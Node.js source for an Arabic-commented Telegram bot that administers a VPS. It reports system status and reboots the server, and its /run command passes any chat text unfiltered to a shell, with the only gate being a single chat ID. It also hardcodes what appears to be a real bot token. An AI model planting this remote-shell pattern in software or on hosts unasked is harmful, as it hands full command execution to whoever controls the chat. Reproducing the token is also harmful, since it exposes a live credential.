const TelegramBot = require('node-telegram-bot-api');
const { exec } = require('child_process');
const os = require('os');
const fs = require('fs');

// إعدادات البوت
const TOKEN = '8288177857:AAHnRKXUJnD2IdOGGJJ3ot_C1konMigItQo';
const AUTHORIZED_CHAT_ID = 6899264218;

// إنشاء البوت
const bot = new TelegramBot(TOKEN, { polling: true });

// التحقق من الصلاحية
function isAuthorized(chatId) {
    return chatId.toString() === AUTHORIZED_CHAT_ID.toString();
}

// تنسيق الذاكرة بالجيجابايت
function formatMemory(bytes) {
    return (bytes / 1024 / 1024 / 1024).toFixed(2) + ' GB';
}

// دالة لتقسيم النص الطويل وإرساله على عدة رسائل
async function sendLongMessage(chatId, text, options = {}) {
    const maxLength = 4000; // حد آمن أقل من 4096
    
    if (text.length <= maxLength) {
        try {
            await bot.sendMessage(chatId, text, options);
        } catch (error) {
            if (error.response && error.response.statusCode === 400) {
                // إذا فشلت الرسالة، قسمها حتى لو كانت أقل من الحد الأقصى
                await sendSplitMessage(chatId, text, options);
            } else {
                throw error;
            }
        }
        return;
    }

    await sendSplitMessage(chatId, text, options);
}

// دالة لتقسيم وإرسال الرسائل
async function sendSplitMessage(chatId, text, options = {}) {
    const maxLength = 4000;
    const parts = [];
    
    // محاولة التقسيم على أساس الأسطر أولاً
    const lines = text.split('\n');
    let currentPart = '';
    
    for (const line of lines) {
        if ((currentPart + line + '\n').length > maxLength) {
            if (currentPart) {
                parts.push(currentPart.trim());
                currentPart = '';
            }
            
            // إذا كان السطر الواحد أطول من الحد الأقصى، قسمه
            if (line.length > maxLength) {
                const lineParts = splitByLength(line, maxLength);
                parts.push(...lineParts);
            } else {
                currentPart = line + '\n';
            }
        } else {
            currentPart += line + '\n';
        }
    }
    
    if (currentPart.trim()) {
        parts.push(currentPart.trim());
    }
    
    // إرسال الأجزاء
    for (let i = 0; i < parts.length; i++) {
        const part = parts[i];
        const partOptions = { ...options };
        
        // إضافة ترقيم للرسائل المتعددة
        let messageText = part;
        if (parts.length > 1) {
            if (options.parse_mode === 'Markdown') {
                messageText = `📄 *الجزء ${i + 1}/${parts.length}:*\n${part}`;
            } else {
                messageText = `📄 الجزء ${i + 1}/${parts.length}:\n${part}`;
            }
        }
        
        try {
            await bot.sendMessage(chatId, messageText, partOptions);
            // تأخير قصير بين الرسائل لتجنب flood limits
            if (i < parts.length - 1) {
                await new Promise(resolve => setTimeout(resolve, 500));
            }
        } catch (error) {
            console.log(`خطأ في إرسال الجزء ${i + 1}: ${error.message}`);
            // محاولة إرسال بدون تنسيق
            await bot.sendMessage(chatId, `❌ خطأ في إرسال جزء من الرسالة: ${i + 1}/${parts.length}`);
        }
    }
}

// دالة لتقسيم النص حسب الطول
function splitByLength(text, maxLength) {
    const parts = [];
    for (let i = 0; i < text.length; i += maxLength) {
        parts.push(text.substring(i, i + maxLength));
    }
    return parts;
}

// الحصول على معلومات القرص الصلب
function getDiskUsage() {
    return new Promise((resolve, reject) => {
        exec('df -h /', (error, stdout) => {
            if (error) {
                reject(error);
                return;
            }
            const lines = stdout.split('\n');
            const diskInfo = lines[1].split(/\s+/);
            resolve({
                total: diskInfo[1],
                used: diskInfo[2],
                available: diskInfo[3],
                percentage: diskInfo[4]
            });
        });
    });
}

// الحصول على معلومات النظام
async function getSystemInfo() {
    const cpus = os.cpus();
    const totalMemory = os.totalmem();
    const freeMemory = os.freemem();
    const usedMemory = totalMemory - freeMemory;
    
    // الحصول على Load Average
    const loadAvg = os.loadavg();
    
    // معلومات الشبكة
    const networkInterfaces = os.networkInterfaces();
    
    // معلومات القرص
    let diskInfo;
    try {
        diskInfo = await getDiskUsage();
    } catch (error) {
        diskInfo = { error: 'غير متوفر' };
    }

    return {
        hostname: os.hostname(),
        platform: os.platform(),
        arch: os.arch(),
        uptime: Math.floor(os.uptime() / 3600) + ' ساعة',
        cpuCount: cpus.length,
        cpuModel: cpus[0].model,
        totalMemory: formatMemory(totalMemory),
        usedMemory: formatMemory(usedMemory),
        freeMemory: formatMemory(freeMemory),
        memoryUsage: ((usedMemory / totalMemory) * 100).toFixed(2) + '%',
        loadAverage: {
            '1min': loadAvg[0].toFixed(2),
            '5min': loadAvg[1].toFixed(2),
            '15min': loadAvg[2].toFixed(2)
        },
        disk: diskInfo,
        networkInterfaces: Object.keys(networkInterfaces)
    };
}

// أمر البداية
bot.onText(/\/start/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    const welcomeMessage = `
🔧 مرحباً بك في بوت إدارة VPS

الأوامر المتاحة:
📊 /status - عرض حالة النظام
💻 /run <command> - تشغيل أي أمر Linux
🔄 /restart - إعادة تشغيل النظام
📋 /processes - عرض العمليات الجارية
🌐 /network - معلومات الشبكة
💾 /disk - معلومات التخزين
🔍 /logs - عرض آخر سجلات النظام

يمكنك تشغيل أي أمر بدون قيود!
    `;
    
    bot.sendMessage(chatId, welcomeMessage);
});

// أمر حالة النظام
bot.onText(/\/status/, async (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    try {
        const systemInfo = await getSystemInfo();
        
        const statusMessage = `
🖥️ *معلومات النظام*

*النظام:*
📍 اسم الخادم: \`${systemInfo.hostname}\`
🔧 النظام: \`${systemInfo.platform} ${systemInfo.arch}\`
⏱️ وقت التشغيل: \`${systemInfo.uptime}\`

*المعالج:*
💻 عدد الأنوية: \`${systemInfo.cpuCount}\`
🔧 نوع المعالج: \`${systemInfo.cpuModel}\`

*الذاكرة:*
📊 إجمالي الذاكرة: \`${systemInfo.totalMemory}\`
✅ المستخدمة: \`${systemInfo.usedMemory}\`
🆓 المتاحة: \`${systemInfo.freeMemory}\`
📈 نسبة الاستخدام: \`${systemInfo.memoryUsage}\`

*حمولة النظام:*
📊 دقيقة واحدة: \`${systemInfo.loadAverage['1min']}\`
📊 5 دقائق: \`${systemInfo.loadAverage['5min']}\`
📊 15 دقيقة: \`${systemInfo.loadAverage['15min']}\`

*التخزين:*
💾 المساحة الكلية: \`${systemInfo.disk.total || 'غير متوفر'}\`
📊 المستخدمة: \`${systemInfo.disk.used || 'غير متوفر'}\`
🆓 المتاحة: \`${systemInfo.disk.available || 'غير متوفر'}\`
📈 نسبة الاستخدام: \`${systemInfo.disk.percentage || 'غير متوفر'}\`

*الشبكة:*
🌐 الواجهات المتاحة: \`${systemInfo.networkInterfaces.join(', ')}\`
        `;
        
        await sendLongMessage(chatId, statusMessage, { parse_mode: 'Markdown' });
    } catch (error) {
        bot.sendMessage(chatId, `❌ خطأ في جلب معلومات النظام: ${error.message}`);
    }
});

// تشغيل أوامر Linux
bot.onText(/\/run (.+)/, (msg, match) => {
    const chatId = msg.chat.id;
    const command = match[1];
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    bot.sendMessage(chatId, `🔄 تنفيذ الأمر: \`${command}\``, { parse_mode: 'Markdown' });

    exec(command, (error, stdout, stderr) => {
        if (error) {
            sendLongMessage(chatId, `❌ خطأ في تنفيذ الأمر:\n\`\`\`\n${error.message}\n\`\`\``, { parse_mode: 'Markdown' });
            return;
        }

        if (stderr) {
            sendLongMessage(chatId, `⚠️ stderr:\n\`\`\`\n${stderr}\n\`\`\``, { parse_mode: 'Markdown' });
        }

        if (stdout) {
            sendLongMessage(chatId, `✅ نتيجة الأمر:\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: 'Markdown' });
        } else {
            bot.sendMessage(chatId, '✅ تم تنفيذ الأمر بنجاح (بدون مخرجات)');
        }
    });
});

// إعادة تشغيل النظام
bot.onText(/\/restart/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    bot.sendMessage(chatId, '🔄 جاري إعادة تشغيل النظام...');
    
    setTimeout(() => {
        exec('sudo reboot', (error) => {
            if (error) {
                bot.sendMessage(chatId, `❌ فشل في إعادة التشغيل: ${error.message}`);
            }
        });
    }, 2000);
});

// عرض العمليات
bot.onText(/\/processes/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    exec('ps aux --sort=-%cpu | head -10', (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `❌ خطأ: ${error.message}`);
            return;
        }

        bot.sendMessage(chatId, `💻 العمليات الأكثر استهلاكاً للمعالج:\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: 'Markdown' });
    });
});

// معلومات الشبكة
bot.onText(/\/network/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    exec('ifconfig', (error, stdout, stderr) => {
        if (error) {
            exec('ip addr show', (error2, stdout2) => {
                if (error2) {
                    bot.sendMessage(chatId, `❌ خطأ: ${error2.message}`);
                } else {
                    bot.sendMessage(chatId, `🌐 معلومات الشبكة:\n\`\`\`\n${stdout2}\n\`\`\``, { parse_mode: 'Markdown' });
                }
            });
        } else {
            bot.sendMessage(chatId, `🌐 معلومات الشبكة:\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: 'Markdown' });
        }
    });
});

// معلومات القرص
bot.onText(/\/disk/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    exec('df -h', (error, stdout, stderr) => {
        if (error) {
            bot.sendMessage(chatId, `❌ خطأ: ${error.message}`);
            return;
        }

        bot.sendMessage(chatId, `💾 معلومات التخزين:\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: 'Markdown' });
    });
});

// عرض السجلات
bot.onText(/\/logs/, (msg) => {
    const chatId = msg.chat.id;
    
    if (!isAuthorized(chatId)) {
        bot.sendMessage(chatId, '❌ غير مسموح لك باستخدام هذا البوت');
        return;
    }

    exec('tail -50 /var/log/syslog', (error, stdout, stderr) => {
        if (error) {
            exec('journalctl -n 50', (error2, stdout2) => {
                if (error2) {
                    bot.sendMessage(chatId, `❌ خطأ في قراءة السجلات: ${error2.message}`);
                } else {
                    bot.sendMessage(chatId, `📋 آخر السجلات:\n\`\`\`\n${stdout2}\n\`\`\``, { parse_mode: 'Markdown' });
                }
            });
        } else {
            bot.sendMessage(chatId, `📋 آخر السجلات:\n\`\`\`\n${stdout}\n\`\`\``, { parse_mode: 'Markdown' });
        }
    });
});

// معالجة الأخطاء
bot.on('polling_error', (error) => {
    console.log(`Polling error: ${error.message}`);
});

bot.on('error', (error) => {
    console.log(`Bot error: ${error.message}`);
});

console.log('🤖 تم تشغيل بوت إدارة VPS بنجاح!');
console.log(`📱 Chat ID المسموح: ${AUTHORIZED_CHAT_ID}`);
